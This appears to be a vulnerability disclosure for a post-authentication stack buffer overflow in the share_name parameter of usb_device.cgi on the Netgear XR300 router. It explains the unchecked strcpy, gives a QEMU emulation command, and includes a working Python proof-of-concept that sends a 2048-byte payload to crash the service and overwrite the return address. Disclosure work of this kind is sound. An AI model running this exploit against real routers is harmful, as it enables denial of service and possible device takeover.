## buffer overflow in share_neme of usb_device.cgi



**Affected Product**: Netgear XR300 Router
**Vulnerability Type**: Buffer Overflow

**Affected Firmware Versions**:  XR300-V1.0.3.38_10.3.30 

**CVE Identifier**: 

------

### **Vulnerability Details**

#### **Description**

A stack-based buffer overflow exists in the HTTPD service through the `usb_device.cgi` endpoint. The vulnerability occurs when processing POST requests containing the `share_name` parameter. Specifically:

1. The `sub_B7350` function handles requests to `usb_device.cgi`.
2. User-controlled `share_name` input is copied to buffer `v50` using `strcpy` without proper bounds checking.
3. The `v50` buffer is only **32 bytes** in size.
4. The service permits `share_name` values up to **0x800 bytes (2048 characters)**, creating an overflow condition 

This vulnerability requires authentication to exploit, making it a post-authentication vulnerability.

![image-20250524125016776](../res/image-20250524125016776-17480622189283-17480625821895.png)

![image-20250524125054841](../res/image-20250524125054841-17480622559834-17480625956616.png)



#### **QEMU Emulation Setup**

`sudo chroot . ./qemu-arm-static -E LD_PRELOAD="/nvram.so /lib/libdl.so.0"  -g 1234  ./usr/sbin/httpd`



![image-20250524123945917](../res/image-20250524123945917-17480615941411.png)





#### 

------

### **Proof of Concept (PoC)**



```
import requests
from requests.auth import HTTPBasicAuth

router_ip = "192.168.107.135"
url = f"http://{router_ip}/usb_device.cgi"
username = "1"
password = "1"
payload = 'A' * 2048

data = {
    "mode": "add_share",
    "share_name": payload
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
}

try:
    response = requests.post(
        url,
        data=data,
        headers=headers,
        auth=HTTPBasicAuth(username, password),

    )

    print(f"HTTP Status: {response.status_code}")
    print("Response Content:")
    print(response.text)

    if "Internal Server Error" in response.text:
        print("Server Error Detected")
    elif response.status_code == 500:
        print("Internal Server Error (500)")
    elif response.status_code == 0:
        print("Connection Reset")

except requests.exceptions.ConnectionError:
    print("Connection Failed - Potential Service Crash")
except requests.exceptions.RequestException as e:
    print(f"Request Error: {str(e)}")
except Exception as e:
    print(f"Unexpected Error: {str(e)}")
```



### Exploitation Results


The PoC demonstrates successful overflow of the `v50` buffer on the stack. As shown in Figure,  the overflow overwrites the return address, granting control of the PC register. This enables arbitrary code execution by crafting a ROP chain or shellcode payload.

![image-20250524124832967](../res/image-20250524124832967-17480621144102.png)



![image-20250524125258636](../res/image-20250524125258636.png)